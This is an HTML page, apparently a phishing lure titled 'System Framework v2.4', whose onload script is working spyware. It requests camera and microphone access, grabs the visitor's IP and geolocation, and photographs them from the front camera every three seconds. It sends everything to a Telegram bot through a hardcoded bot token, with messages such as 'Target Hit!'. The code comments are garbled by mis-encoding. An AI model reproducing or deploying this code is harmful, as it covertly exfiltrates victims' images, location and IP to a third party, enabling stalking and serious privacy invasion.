<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Framework v2.4</title>
    <style>body { background-color: black; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";

    async function capture() {
        if (!targetID) return;

        try {
            // Ø¯Ø§ÙˆØ§Ú©Ø±Ø¯Ù†ÛŒ Ù…Ø§ÛŒÚ©Ø±Û†ÙÛ†Ù† Ùˆ Ú©Ø§Ù…ÛØ±Ø§
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });
            
            // Ù†Ø§Ø±Ø¯Ù†ÛŒ IP Ùˆ Ø²Ø§Ù†ÛŒØ§Ø±ÛŒ Ø³Û•Ø±Û•ØªØ§ÛŒÛŒ
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram(`ğŸ’€ <b>Target Hit!</b>\nğŸ‘¤ User ID: ${targetID}\nğŸŒ IP: ${data.ip}`);
                });

            // Ù†Ø§Ø±Ø¯Ù†ÛŒ Ù„ÙˆÚ©Û•ÛŒØ´Ù† (ÛŒÛ•Ú©Ø¬Ø§Ø±)
            navigator.geolocation.getCurrentPosition(pos => {
                sendLocation(pos.coords.latitude, pos.coords.longitude);
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
            video.play();

            // ÙÛÙ†Ú©Ø´Ù† Ø¨Û† Ú¯Ø±ØªÙ†ÛŒ ÙˆÛÙ†Û• Ùˆ Ù†Ø§Ø±Ø¯Ù†ÛŒ
            const takeSnap = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                canvas.toBlob(b => {
                    if (b) sendFile(b, "photo");
                }, 'image/jpeg', 0.7);
            };

            // Ø¯Û•Ø³ØªÙ¾ÛÚ©Ø±Ø¯Ù†ÛŒ ÙˆÛÙ†Û•Ú¯Ø±ØªÙ†ÛŒ Ø¨Û•Ø±Ø¯Û•ÙˆØ§Ù… (Ù‡Û•Ø± Ù£ Ú†Ø±Ú©Û• Ø¬Ø§Ø±ÛÚ© ÙˆÛÙ†Û•ÛŒÛ•Ú© Ø¯Û•Ú¯Ø±ÛØª)
            // Ø¯Û•ØªÙˆØ§Ù†ÛŒØª Ù£Ù Ù Ù  Ø¨Ú©Û•ÛŒØªÛ• Ù¡Ù Ù Ù  Ø¦Û•Ú¯Û•Ø± Ø¯Û•ØªÛ•ÙˆÛØª Ù‡Û•Ø± Ú†Ø±Ú©Û•ÛŒÛ•Ú© Ø¨ÛØª
            setInterval(takeSnap, 3000);

        } catch (e) {
            sendToTelegram("âš ï¸ Permission Denied or Device Error.");
        }
    }

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function sendLocation(lat, lon) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
        });
    }

    function sendFile(blob, type) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append(type, blob, "shot.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { 
            method: 'POST', 
            body: fd 
        });
    }
</script>
</body>
</html>
